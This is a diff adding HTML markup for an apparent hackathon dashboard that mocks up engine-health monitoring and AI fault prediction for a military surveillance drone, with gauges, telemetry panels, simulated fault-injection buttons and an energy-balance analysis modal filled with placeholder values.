+                            <circle class="track" cx="23" cy="23" r="19"/>
+                            <circle class="fill" id="dialRingOilPress" cx="23" cy="23" r="19" stroke="#00e676" stroke-dasharray="119.4" stroke-dashoffset="42"/>
+                        </svg>
+                        <div class="dial-center-icon" style="color:#00e676;">💧</div>
+                    </div>
+                    <div class="gauge-meta">
+                        <span class="gauge-name">Oil Pressure</span>
+                        <span class="gauge-readout"><span id="valOilPress">3.2</span> <span class="gauge-unit">bar</span></span>
+                    </div>
+                </div>
+
+                <!-- 4. Fuel Flow -->
+                <div class="gauge-dial-card">
+                    <div class="radial-svg-wrap">
+                        <svg viewBox="0 0 46 46">
+                            <circle class="track" cx="23" cy="23" r="19"/>
+                            <circle class="fill" id="dialRingFuelFlow" cx="23" cy="23" r="19" stroke="#00d4ff" stroke-dasharray="119.4" stroke-dashoffset="48"/>
+                        </svg>
+                        <div class="dial-center-icon" style="color:#00d4ff;">⛽</div>
+                    </div>
+                    <div class="gauge-meta">
+                        <span class="gauge-name">Fuel Flow</span>
+                        <span class="gauge-readout"><span id="valFuelFlow">28.5</span> <span class="gauge-unit">kg/hr</span></span>
+                    </div>
+                </div>
+
+                <!-- 5. Cylinder Head Temp -->
+                <div class="gauge-dial-card">
+                    <div class="radial-svg-wrap">
+                        <svg viewBox="0 0 46 46">
+                            <circle class="track" cx="23" cy="23" r="19"/>
+                            <circle class="fill" id="dialRingCHT" cx="23" cy="23" r="19" stroke="#00e676" stroke-dasharray="119.4" stroke-dashoffset="35"/>
+                        </svg>
+                        <div class="dial-center-icon" style="color:#00e676;">🌡️</div>
+                    </div>
+                    <div class="gauge-meta">
+                        <span class="gauge-name">Cylinder Head Temp</span>
+                        <span class="gauge-readout"><span id="valCHT">182</span> <span class="gauge-unit">°C</span></span>
+                    </div>
+                </div>
+
+                <!-- 6. Vibration (RMS) -->
+                <div class="gauge-dial-card">
+                    <div class="radial-svg-wrap">
+                        <svg viewBox="0 0 46 46">
+                            <circle class="track" cx="23" cy="23" r="19"/>
+                            <circle class="fill" id="dialRingVibe" cx="23" cy="23" r="19" stroke="#00e676" stroke-dasharray="119.4" stroke-dashoffset="85"/>
+                        </svg>
+                        <div class="dial-center-icon" style="color:#00e676;">〰️</div>
+                    </div>
+                    <div class="gauge-meta">
+                        <span class="gauge-name">Vibration (RMS)</span>
+                        <span class="gauge-readout"><span id="valVib">0.12</span> <span class="gauge-unit">g</span></span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============================================================
+                 SIH CORE PIPELINE RIBBON: 4-STAGE METHODOLOGY
+                 01. Data Ingest -> 02. Physics Fusion -> 03. AI Diagnostics -> 04. Pilot Warnings
+                 ============================================================ -->
+            <section class="sih-pipeline-ribbon" onclick="switchNavSection(document.querySelector('.nav-sih-item'), 'sih-innovations')" title="Open Innovations &amp; Military Defense Control Center">
+                <div class="pipe-header-strip">
+                    <span style="color:#ffd54f; font-weight:800; font-family:var(--font-display); font-size:12px;">🔄 REAL-TIME FADEC &amp; PREDICTIVE DIAGNOSTICS PIPELINE</span>
+                    <span style="color:#00f0ff; font-size:11px; font-family:var(--font-mono);"><strong id="hudBatteryVal">28.42V DC Bus</strong> &nbsp;|&nbsp; <strong id="hudInjectionVal">22.5° BTDC Injection</strong> &nbsp;|&nbsp; 99.2% CONSISTENCY</span>
+                </div>
+                <div class="pipe-steps-strip">
+                    <div class="pipe-step-box">
+                        <div class="pipe-step-num">01</div>
+                        <div class="pipe-step-body">
+                            <div class="pipe-step-title">DATA INGEST</div>
+                            <div class="pipe-step-detail">Socket CAN Bus &amp; MAVLink @ 5 Hz</div>
+                            <div class="pipe-step-status" id="pipeStatus1">● 24-CH ACTIVE (248K+ Frames)</div>
+                        </div>
+                    </div>
+                    <div class="pipe-arrow">➔</div>
+                    <div class="pipe-step-box">
+                        <div class="pipe-step-num" style="color:#00e676;">02</div>
+                        <div class="pipe-step-body">
+                            <div class="pipe-step-title">PHYSICS FUSION</div>
+                            <div class="pipe-step-detail">PINN 1st-Law Energy Conservation</div>
+                            <div class="pipe-step-status" id="pipeStatus2" style="color:#00e676;">● ΔE = 0.08 kW (99.2% Match)</div>
+                        </div>
+                    </div>
+                    <div class="pipe-arrow">➔</div>
+                    <div class="pipe-step-box">
+                        <div class="pipe-step-num" style="color:#ffd54f;">03</div>
+                        <div class="pipe-step-body">
+                            <div class="pipe-step-title">AI DIAGNOSTICS</div>
+                            <div class="pipe-step-detail">LSTM Autoencoder + 8-Band FFT</div>
+                            <div class="pipe-step-status" id="pipeStatus3" style="color:#ffd54f;">● Residual Anomaly: 0.041 (NOM)</div>
+                        </div>
+                    </div>
+                    <div class="pipe-arrow">➔</div>
+                    <div class="pipe-step-box">
+                        <div class="pipe-step-num" style="color:#00f0ff;">04</div>
+                        <div class="pipe-step-body">
+                            <div class="pipe-step-title">PILOT WARNINGS</div>
+                            <div class="pipe-step-detail">NATO Audio Codes + 15-30m Advance Alert</div>
+                            <div class="pipe-step-status" id="pipeStatus4" style="color:#00e676;">● STANDBY (GREEN ADVISORY)</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============================================================
+                 ROW 2: HERO SECTION (UAV STATUS + PHOTOREALISTIC 3D ENGINE + X-RAY TWIN)
+                 ============================================================ -->
+            <section class="hero-three-col-grid">
+
+                <!-- LEFT CARD: UAV & Mission Status -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">🛩️</span>
+                            <span>UAV &amp; Mission Status</span>
+                        </div>
+                    </div>
+
+                    <div class="uav-photo-box">
+                        <img src="assets/uav_live_flight.jpg" alt="DRDO Tapas BH-201 Live Flight" class="uav-photo-img">
+                        <div class="uav-photo-badge top-left" id="hudNavBadge">NavIC + RLG INS</div>
+                        <div class="uav-photo-badge top-right" id="hudStatusBadge">● Stable Flight</div>
+                    </div>
+
+                    <div class="uav-specs-table">
+                        <div class="uav-spec-row">
+                            <span class="k">UAV Type</span>
+                            <span class="v" id="valUAVType">MALE UAV (Tapas BH-201)</span>
+                        </div>
+                        <div class="uav-spec-row">
+                            <span class="k">Altitude</span>
+                            <span class="v" id="valAltitude">18,500 ft</span>
+                        </div>
+                        <div class="uav-spec-row">
+                            <span class="k">Speed</span>
+                            <span class="v" id="valSpeed">220 km/h</span>
+                        </div>
+                        <div class="uav-spec-row">
+                            <span class="k">Endurance</span>
+                            <span class="v" id="valEndurance">12h 24m (est.)</span>
+                        </div>
+                        <div class="uav-spec-row">
+                            <span class="k">Mission</span>
+                            <span class="v" id="valMissionType">Surveillance</span>
+                        </div>
+                        <div class="uav-spec-row">
+                            <span class="k">Coordinates</span>
+                            <span class="v" id="valCoords" style="font-family:var(--font-mono); font-size:10.5px;">32.6581° N, 76.2156° E</span>
+                        </div>
+                        <div class="uav-spec-row">
+                            <span class="k">Status</span>
+                            <span class="v status-green" id="valFlightStatus">Stable Flight</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CENTER HERO SHOWCASE: PHOTOREALISTIC 3D AERO-PISTON ENGINE DIGITAL TWIN -->
+                <div class="center-engine-showcase">
+                    <div class="engine-showcase-topbar">
+                        <div class="panel-title">
+                            <span class="p-icon">⚙️</span>
+                            <span>Rotax 914 F / VRDE Turbocharged Aero-Piston Digital Twin</span>
+                        </div>
+                        <div class="engine-mode-pills">
+                            <button class="mode-pill-btn active" id="btnModePhoto" onclick="setHeroEngineMode('photorealistic')">
+                                🔥 Photorealistic 3D Twin
+                            </button>
+                            <button class="mode-pill-btn" id="btnModeXrayBlend" onclick="setHeroEngineMode('xray')">
+                                🩻 Holographic X-Ray Cutaway
+                            </button>
+                            <button class="mode-pill-btn" id="btnModeWebGL" onclick="setHeroEngineMode('webgl')">
+                                🧊 360° Interactive 3D CAD
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="engine-stage-viewport">
+                        <!-- Photorealistic + X-Ray Layered Render Stack -->
+                        <div class="engine-render-stack" id="photoEngineStack">
+                            <img src="assets/engine_photorealistic_twin.jpg" alt="Photorealistic 3D Aero-Piston Engine" class="engine-hero-img" id="heroPhotoImg">
+                            <img src="assets/engine_xray_internal.jpg" alt="X-Ray Internal Cutaway" class="engine-xray-overlay-img" id="heroXrayOverlayImg">
+                            <!-- Live Animated Particle Airflow, Combustion Pulses & Thermal Glow Canvas -->
+                            <canvas id="engineHeroParticleCanvas" class="engine-particle-canvas" width="760" height="270"></canvas>
+                        </div>
+
+                        <!-- Interactive 360° Three.js PBR CAD Stage (Toggled via 360° CAD button) -->
+                        <div class="three-cad-stage hidden" id="threeContainer"></div>
+
+                        <!-- Interactive Engineering Callouts matching Reference Image 1 -->
+                        <div class="engine-callouts-layer" id="engineCalloutsLayer">
+                            <div class="eng-callout inlet-tag" onclick="inspectEngineSubsystem('AIR_INLET')">
+                                <strong>Air Inlet</strong> · <span id="tagInletFlow">419 kg/hr</span>
+                            </div>
+                            <div class="eng-callout compressor-tag" onclick="inspectEngineSubsystem('COMPRESSOR')">
+                                Compressor (Turbocharger) · <span id="tagMAP">1,185 hPa</span>
+                            </div>
+                            <div class="eng-callout intercooler-tag" onclick="inspectEngineSubsystem('INTERCOOLER')">
+                                Intercooler · <span id="tagChargeTemp">42 °C</span>
+                            </div>
+                            <div class="eng-callout exhaust-tag" onclick="inspectEngineSubsystem('EXHAUST_OUT')">
+                                <strong>Exhaust Out</strong> · <span id="tagExhaustTemp">685 °C</span>
+                            </div>
+                            <div class="eng-callout turbine-tag" onclick="inspectEngineSubsystem('TURBINE')">
+                                Turbine (Turbocharger) · <span id="tagTurbineRPM">18,200 RPM</span>
+                            </div>
+                            <div class="eng-callout piston-tag" onclick="inspectEngineSubsystem('PISTON_CORE')">
+                                Piston Engine (4-Cylinder Boxer) · <span id="tagCHT">182 °C</span>
+                            </div>
+                            <div class="eng-callout fuel-tag" onclick="inspectEngineSubsystem('FUEL_SYSTEM')">
+                                Fuel System (Dual EFI) · <span id="tagFuelFlow">28.5 kg/hr</span>
+                            </div>
+                            <div class="eng-callout oil-tag" onclick="inspectEngineSubsystem('OIL_SYSTEM')">
+                                Oil System (Dry-Sump) · <span id="tagOilPress">3.2 bar</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="engine-showcase-bottombar">
+                        <div class="slider-control-group">
+                            <label id="sliderModeLabel">X-RAY / CAD EXPLODE SCANNER:</label>
+                            <input type="range" id="explodeSlider" min="0" max="100" value="0" oninput="onExplodeSlider(this.value)">
+                            <span id="explodePctLabel" style="font-family:var(--font-mono); color:var(--cyan-bright); min-width:95px; text-align:right;">0% (METALLIC)</span>
+                        </div>
+                        <div style="font-family:var(--font-mono); font-size:10.5px; color:var(--text-light);">
+                            Brake Power: <strong style="color:var(--green-nominal);" id="valBrakePower">117.8 kW (158 HP)</strong> |
+                            PINN Residual: <strong style="color:var(--cyan-bright);" id="valHeroResidual">0.0412</strong>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- RIGHT CARD: 3D Digital Twin View (Internal X-Ray & External UAV X-Ray + 10 Checkboxes) -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">🧊</span>
+                            <span>3D Digital Twin View</span>
+                        </div>
+                        <button class="geo-ctrl-btn" title="Toggle Fullscreen 3D CAD" onclick="setHeroEngineMode('webgl')">⛶</button>
+                    </div>
+
+                    <div class="twin-view-tabs">
+                        <button class="twin-tab-btn" id="btnExtView" onclick="setViewMode('external')">External View</button>
+                        <button class="twin-tab-btn active" id="btnIntView" onclick="setViewMode('internal')">Internal View</button>
+                    </div>
+
+                    <div class="xray-inspector-body">
+                        <div class="xray-stage-box">
+                            <img src="assets/engine_xray_internal.jpg" alt="3D Holographic X-Ray Twin" class="xray-stage-img" id="rightTwinStageImg">
+                            <canvas id="xraySubsystemCanvas" class="xray-highlight-canvas" width="240" height="215"></canvas>
+                            <div class="xray-telemetry-mini-overlay">
+                                <span>Core: <strong id="twinTemp">612 °C</strong></span>
+                                <span>Spool: <strong id="twinTurbine">18,200 RPM</strong></span>
+                                <span>EGT: <strong id="twinEGT">635 °C</strong></span>
+                            </div>
+                        </div>
+
+                        <!-- 10 Interactive Component Checkboxes from Reference Image 1 -->
+                        <div class="subsystem-checklist">
+                            <label class="sub-check-item"><input type="checkbox" onchange="toggleSubsystemHighlight('block', this.checked)"> Engine Block</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleSubsystemHighlight('pistons', this.checked)"> Pistons</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleSubsystemHighlight('crankshaft', this.checked)"> Crankshaft</label>
+                            <label class="sub-check-item"><input type="checkbox" onchange="toggleSubsystemHighlight('camshaft', this.checked)"> Camshaft</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleSubsystemHighlight('turbo', this.checked)"> Turbocharger</label>
+                            <label class="sub-check-item"><input type="checkbox" onchange="toggleSubsystemHighlight('intake', this.checked)"> Intake System</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleSubsystemHighlight('exhaust', this.checked)"> Exhaust System</label>
+                            <label class="sub-check-item"><input type="checkbox" onchange="toggleSubsystemHighlight('lubrication', this.checked)"> Lubrication</label>
+                            <label class="sub-check-item"><input type="checkbox" onchange="toggleSubsystemHighlight('fuel', this.checked)"> Fuel System</label>
+                            <label class="sub-check-item"><input type="checkbox" onchange="toggleSubsystemHighlight('sensors', this.checked)"> Sensors</label>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============================================================
+                 ROW 3: REAL-TIME TELEMETRY + AI FAULT PREDICTION + COMPONENT HEALTH
+                 ============================================================ -->
+            <section class="middle-three-col-grid">
+
+                <!-- CARD 1: Real-Time Telemetry -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">📈</span>
+                            <span>Real-Time Telemetry</span>
+                        </div>
+                        <div style="display:flex; align-items:center; gap:8px;">
+                            <select id="telemetryWindowSelect" onchange="changeTelemetryWindow(this.value)" style="background:#071428; color:#cbd5e1; border:1px solid rgba(0,212,255,0.28); border-radius:4px; padding:2px 6px; font-size:11px;">
+                                <option value="15m">Last 15 Minutes</option>
+                                <option value="5m">Last 5 Minutes</option>
+                                <option value="live">Live 100 Hz Stream</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="telemetry-legend-bar">
+                        <div class="t-legend-item"><span class="t-dot" style="background:#ff3b5c;"></span><span>RPM</span></div>
+                        <div class="t-legend-item"><span class="t-dot" style="background:#ffb300;"></span><span>EGT (°C)</span></div>
+                        <div class="t-legend-item"><span class="t-dot" style="background:#00e676;"></span><span>Oil Pressure</span></div>
+                        <div class="t-legend-item"><span class="t-dot" style="background:#00d4ff;"></span><span>Fuel Flow</span></div>
+                    </div>
+
+                    <div class="chart-canvas-wrap">
+                        <canvas id="liveTelemetryCanvas" width="460" height="155"></canvas>
+                    </div>
+                </div>
+
+                <!-- CARD 2: AI Fault Prediction -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">🧠</span>
+                            <span>AI Fault Prediction</span>
+                        </div>
+                        <span style="font-family:var(--font-mono); font-size:10px; color:var(--text-muted);">PINN + LSTM RUL Engine</span>
+                    </div>
+
+                    <div class="ai-status-strip" id="aiStatusBanner">
+                        <div class="ai-check-badge" id="aiCheckIcon">✔</div>
+                        <div>
+                            <div style="font-weight:700; font-size:12.5px; color:var(--green-nominal);" id="aiPredictionTitle">No Immediate Fault Detected</div>
+                            <div style="font-size:11px; color:var(--text-light);" id="aiPredictionDesc">Engine is operating within normal parameters.</div>
+                        </div>
+                    </div>
+
+                    <div class="ai-prediction-split">
+                        <div class="health-dial-box">
+                            <div class="health-dial-label">Health Score</div>
+                            <div class="health-ring-svg-wrap">
+                                <svg viewBox="0 0 112 112">
+                                    <circle class="track" cx="56" cy="56" r="46"/>
+                                    <circle class="score-arc" id="mainHealthArc" cx="56" cy="56" r="46"/>
+                                </svg>
+                                <div class="health-ring-center">
+                                    <span class="health-pct-big" id="mainHealthNum">92%</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="ai-insights-column">
+                            <div>
+                                <div style="font-weight:600; font-size:12px; color:#ffffff; margin-bottom:5px;">AI Insights</div>
+                                <ul class="ai-insights-list" id="aiInsightsList">
+                                    <li>All parameters are in normal range.</li>
+                                    <li>Slight increase in EGT (within limits).</li>
+                                    <li>Recommended: Monitor oil pressure for next 2 hours.</li>
+                                    <li>Remaining Useful Life (RUL): <strong style="color:var(--green-nominal);" id="valRUL">~ 320 Flight Hours</strong></li>
+                                </ul>
+                            </div>
+
+                            <button class="btn-run-deep-analysis" onclick="openPINNDeepAnalysisModal()">
+                                <span>🧠</span>
+                                <span>Run Deep Analysis</span>
+                            </button>
+
+                            <!-- Real-Time Residual Analysis Strip -->
+                            <div class="sih-residual-mini-strip" onclick="switchNavSection(document.querySelector('.nav-sih-item'), 'sih-innovations')" title="Open Innovations &amp; Military Defense Control Center">
+                                <div style="display:flex; justify-content:space-between; align-items:center;">
+                                    <span style="font-weight:700; color:#00f0ff; font-size:11px;">📈 RESIDUAL DIVERGENCE ANALYSIS</span>
+                                    <span style="color:#00e676; font-size:10px; font-weight:700;">● ZERO FALSE ALARMS</span>
+                                </div>
+                                <div style="font-size:10px; color:#cbd5e1; margin-top:2px;">
+                                    Physics vs Sensor Δ: <strong style="color:#00e676;">Nominal (&lt; 2σ)</strong> | Engine vs Sensor Faults: <strong style="color:#00f0ff;">Separated</strong>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CARD 3: Component Health -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">🛡️</span>
+                            <span>Component Health</span>
+                        </div>
+                        <span style="font-family:var(--font-mono); font-size:10px; color:var(--green-nominal);" id="statOverall">Nominal</span>
+                    </div>
+
+                    <div class="comp-health-list">
+                        <div class="comp-health-row">
+                            <span class="comp-name">🔩 Pistons</span>
+                            <div class="comp-bar-track"><div class="comp-bar-fill" id="barPistons" style="width:95%;"></div></div>
+                            <span class="comp-pct" id="pctPistons">95%</span>
+                        </div>
+                        <div class="comp-health-row">
+                            <span class="comp-name">🌀 Turbocharger</span>
+                            <div class="comp-bar-track"><div class="comp-bar-fill" id="barTurbo" style="width:90%;"></div></div>
+                            <span class="comp-pct" id="pctTurbo">90%</span>
+                        </div>
+                        <div class="comp-health-row">
+                            <span class="comp-name">⛽ Fuel System</span>
+                            <div class="comp-bar-track"><div class="comp-bar-fill" id="barFuel" style="width:92%;"></div></div>
+                            <span class="comp-pct" id="pctFuel">92%</span>
+                        </div>
+                        <div class="comp-health-row">
+                            <span class="comp-name">🛢️ Oil System</span>
+                            <div class="comp-bar-track"><div class="comp-bar-fill warn" id="barOil" style="width:88%;"></div></div>
+                            <span class="comp-pct" id="pctOil">88%</span>
+                        </div>
+                        <div class="comp-health-row">
+                            <span class="comp-name">❄️ Cooling System</span>
+                            <div class="comp-bar-track"><div class="comp-bar-fill" id="barCooling" style="width:94%;"></div></div>
+                            <span class="comp-pct" id="pctCooling">94%</span>
+                        </div>
+                        <div class="comp-health-row">
+                            <span class="comp-name">🔥 Exhaust System</span>
+                            <div class="comp-bar-track"><div class="comp-bar-fill" id="barExhaust" style="width:91%;"></div></div>
+                            <span class="comp-pct" id="pctExhaust">91%</span>
+                        </div>
+                        <div class="comp-health-row">
+                            <span class="comp-name">📡 Sensors</span>
+                            <div class="comp-bar-track"><div class="comp-bar-fill" id="barSensors" style="width:96%;"></div></div>
+                            <span class="comp-pct" id="pctSensors">96%</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============================================================
+                 ROW 4: GEOSPATIAL TRACKING + ALERTS & NOTIFICATIONS + MISSION SUMMARY
+                 ============================================================ -->
+            <section class="bottom-three-col-grid">
+
+                <!-- CARD 1: Geospatial Tracking -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">🌐</span>
+                            <span>Geospatial Tracking</span>
+                        </div>
+                        <div style="display:flex; align-items:center; gap:8px;">
+                            <select id="sectorSelect" onchange="changeOperationalTerrain(this.value)" style="background:#071428; color:#00d4ff; border:1px solid rgba(0,212,255,0.3); border-radius:4px; padding:2px 6px; font-size:10.5px;">
+                                <option value="NORTHERN_BORDER_SECTOR">Northern Border Sector (18,500 ft)</option>
+                                <option value="CHITRADURGA_ATR">DRDO Chitradurga ATR (16,200 ft)</option>
+                                <option value="POKHRAN_WESTERN_SECTOR">Western Desert Sector (14,800 ft)</option>
+                                <option value="KARWAR_MARITIME_SECTOR">Arabian Sea Maritime (12,500 ft)</option>
+                            </select>
+                            <div class="live-pill-badge" style="padding:2px 8px; font-size:10.5px;">
+                                <span class="pulse-dot"></span><span>Live</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="geo-tracking-split">
+                        <div class="geo-canvas-box">
+                            <canvas id="geoRadarCanvas" width="380" height="138"></canvas>
+                            <div class="geo-zoom-controls">
+                                <button class="geo-ctrl-btn" onclick="adjustMapZoom(0.15)">+</button>
+                                <button class="geo-ctrl-btn" onclick="adjustMapZoom(-0.15)">−</button>
+                                <button class="geo-ctrl-btn" onclick="resetMapZoom()">⌖</button>
+                            </div>
+                        </div>
+
+                        <div class="subsystem-checklist">
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleMapLayer('uav', this.checked)"> UAV Position</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleMapLayer('path', this.checked)"> Flight Path</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleMapLayer('base', this.checked)"> Base Station</label>
+                            <label class="sub-check-item"><input type="checkbox" onchange="toggleMapLayer('geofence', this.checked)"> Geo-Fence</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleMapLayer('nfz', this.checked)"> No-Fly Zone</label>
+                            <label class="sub-check-item"><input type="checkbox" checked onchange="toggleMapLayer('checkpoints', this.checked)"> Checkpoint</label>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CARD 2: Alerts & Notifications -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">🔔</span>
+                            <span>Alerts &amp; Notifications</span>
+                        </div>
+                        <div style="display:flex; gap:6px; align-items:center;">
+                            <button class="btn-fadec" style="padding:2px 8px; font-size:10.5px;" onclick="clearAlertLogs()">Clear</button>
+                        </div>
+                    </div>
+
+                    <div class="alerts-table-list" id="alertsLogContainer">
+                        <div class="alert-row-item">
+                            <span class="alert-time">14:28</span>
+                            <span class="alert-tag info">INFO</span>
+                            <span>All parameters normal</span>
+                        </div>
+                        <div class="alert-row-item">
+                            <span class="alert-time">14:10</span>
+                            <span class="alert-tag info">INFO</span>
+                            <span>Fuel flow stable at 28.5 kg/hr</span>
+                        </div>
+                        <div class="alert-row-item warn">
+                            <span class="alert-time">13:45</span>
+                            <span class="alert-tag warn">WARN</span>
+                            <span>Slight increase in exhaust temp (within threshold)</span>
+                        </div>
+                        <div class="alert-row-item">
+                            <span class="alert-time">12:30</span>
+                            <span class="alert-tag info">INFO</span>
+                            <span>Mission waypoint reached</span>
+                        </div>
+                        <div class="alert-row-item">
+                            <span class="alert-time">11:05</span>
+                            <span class="alert-tag info">INFO</span>
+                            <span>Environmental conditions nominal</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CARD 3: Mission Summary -->
+                <div class="gcs-panel">
+                    <div class="panel-header">
+                        <div class="panel-title">
+                            <span class="p-icon">📋</span>
+                            <span>Mission Summary</span>
+                        </div>
+                        <button class="btn-fadec" style="padding:3px 10px; font-size:11px; border-color:var(--cyan-bright); color:#fff;" onclick="openDRDOWorkOrderModal()">
+                            📄 Export Report
+                        </button>
+                    </div>
+
+                    <div class="mission-summary-rows">
+                        <div class="m-sum-row">
+                            <span class="k">Mission ID</span>
+                            <span class="v" style="font-family:var(--font-mono);">TGCS-2026-0918</span>
+                        </div>
+                        <div class="m-sum-row">
+                            <span class="k">Flight Duration</span>
+                            <span class="v" id="missionDuration">06h 12m (ongoing)</span>
+                        </div>
+                        <div class="m-sum-row">
+                            <span class="k">Distance Covered</span>
+                            <span class="v" id="valDistance">1,280 km</span>
+                        </div>
+                        <div class="m-sum-row">
+                            <span class="k">Avg. Engine Health</span>
+                            <span class="v" style="color:var(--green-nominal);" id="valSummaryHealth">92%</span>
+                        </div>
+                        <div class="m-sum-row">
+                            <span class="k">AI Prediction</span>
+                            <span class="v" id="valSummaryPred">No fault expected (next 12h)</span>
+                        </div>
+                        <div class="m-sum-row">
+                            <span class="k">Status</span>
+                            <span class="v" style="color:var(--green-nominal);" id="valSummaryStatus">On Track</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ============================================================
+                 ROW 5: FADEC HARDWARE-IN-THE-LOOP (HIL) & SOVEREIGN ENGINEERING CONSOLE
+                 ============================================================ -->
+            <section class="fadec-hil-bar">
+                <div class="fadec-bar-title">
+                    <span>🎛️ FADEC HIL PROPULSION STRESS TESTER &amp; SOVEREIGN DIAGNOSTICS:</span>
+                </div>
+                <div class="fadec-btn-group">
+                    <button class="btn-fadec nominal" onclick="clearFaults()">✔ Nominal Cruise (18,500 ft)</button>
+                    <button class="btn-fadec stress" onclick="injectFault('COOLANT_LEAK')">🌡️ Cyl-2 Coolant Jacket Loss</button>
+                    <button class="btn-fadec stress" onclick="injectFault('INJECTOR_CLOG')">⛽ EFI Injector-2 Lean Restriction</button>
+                    <button class="btn-fadec stress" onclick="injectFault('OIL_PRESSURE_DROP')">🛢️ Main Bearing Oil Pressure Loss</button>
+                    <button class="btn-fadec stress" onclick="injectFault('TURBO_PRESSURE_DROP')">🌀 Garrett T25 Wastegate Fault</button>
+                    <button class="btn-fadec stress" onclick="injectFault('SPARK_MISFIRE')">⚡ CDI Magneto Lane-A Misfire</button>
+                    <button class="btn-fadec" onclick="openGlidePolarModal()">✈️ Dead-Stick Glide Polar</button>
+                    <button class="btn-fadec" onclick="openSecurityVaultModal()">🛡️ AeroDB &amp; NIST Security Vault</button>
+                </div>
+            </section>
+
+        </main>
+    </div>
+
+    <!-- ====================================================================
+         3. FOOTER BAR (WITH LIVE SOVEREIGN SECURITY & INTEGRITY CONTROLS)
+         ==================================================================== -->
+    <footer class="gcs-footer">
+        <div>
+            <strong style="color:#ffffff;">Twin GCS</strong> &nbsp;|&nbsp; AI for Reliable Skies &nbsp;|&nbsp; Develop • Detect • Predict • Protect
+        </div>
+        <div style="display:flex; align-items:center; gap:10px;">
+            <div class="footer-sec-pill" onclick="openSystemSecurityAuditModal()" title="Click to view air-gapped security status">
+                <span class="sec-dot pulse"></span>
+                <span>SOVEREIGN AIR-GAP: 100% SECURE</span>
+            </div>
+            <button class="btn-footer-security-scan" onclick="openSystemSecurityAuditModal()">
+                <span>🛡️</span><span>RUN SYSTEM SECURITY AUDIT</span>
+            </button>
+            <button class="btn-footer-security-scan btn-sih-innovations-pill" onclick="openSihInnovationsModal()" title="Open SIH 2026 Presentation Hub">
+                <span>🌟</span><span>SIH 2026 INNOVATIONS</span>
+            </button>
+        </div>
+        <div class="footer-tricolour-pill">
+            <span>🇮🇳</span>
+            <span>JAI HIND &nbsp;|&nbsp; JAI VIGYAN</span>
+        </div>
+    </footer>
+
+    <!-- ====================================================================
+         4. MODAL 1: PINN DEEP PHYSICS, 4-CYLINDER MATRIX & FFT SPECTRUM
+         ==================================================================== -->
+    <div class="tactical-modal-backdrop" id="pinnAnalysisModal">
+        <div class="tactical-modal-card">
+            <div class="modal-top-bar">
+                <h3>🧠 Physics-Informed Neural Network (PINN) &amp; 4-Cylinder Combustion Telemetry</h3>
+                <button class="modal-close-btn" onclick="closeModal('pinnAnalysisModal')">✕ Close</button>
+            </div>
+
+            <div class="modal-grid-2col">
+                <div class="modal-stat-box">
+                    <h4 style="color:var(--cyan-primary); font-family:var(--font-display); margin-bottom:8px;">First-Law Thermodynamic Energy Balance</h4>
+                    <div class="m-sum-row"><span class="k">Fuel Chemical Enthalpy (Q_fuel):</span><span class="v" id="pinnQFuel">344.4 kW</span></div>
+                    <div class="m-sum-row"><span class="k">Mechanical Brake Shaft Power:</span><span class="v" style="color:var(--green-nominal);" id="pinnPBrake">117.8 kW (158 HP)</span></div>
+                    <div class="m-sum-row"><span class="k">Liquid Jacket Heat Rejection:</span><span class="v" id="pinnQCool">84.4 kW</span></div>
+                    <div class="m-sum-row"><span class="k">Exhaust Gas Enthalpy Flux:</span><span class="v" id="pinnHExh">109.5 kW</span></div>
+                    <div class="m-sum-row"><span class="k">Brake Specific Fuel Cons. (BSFC):</span><span class="v" id="pinnBSFC">241.9 g/kWh</span></div>
+                    <div class="m-sum-row"><span class="k">PINN Conservation Residual Loss:</span><span class="v" style="color:var(--cyan-bright);" id="pinnResidual">0.0412</span></div>
+                </div>
+
+                <div class="modal-stat-box">
+                    <h4 style="color:var(--cyan-primary); font-family:var(--font-display); margin-bottom:8px;">Individual 4-Cylinder Boxer Matrix</h4>
+                    <table class="modal-table" style="margin:0;">
+                        <thead>
+                            <tr><th>Cylinder</th><th>CHT (°C)</th><th>EGT (°C)</th><th>Lambda (λ)</th></tr>
+                        </thead>
+                        <tbody id="cylMatrixBody">
+                            <tr><td>Cyl 1 (Front-Left)</td><td>178.0 °C</td><td>676.0 °C</td><td>0.98</td></tr>
+                            <tr><td>Cyl 2 (Front-Right)</td><td>182.0 °C</td><td>685.0 °C</td><td>0.98</td></tr>
+                            <tr><td>Cyl 3 (Rear-Left)</td><td>179.0 °C</td><td>680.0 °C</td><td>0.98</td></tr>
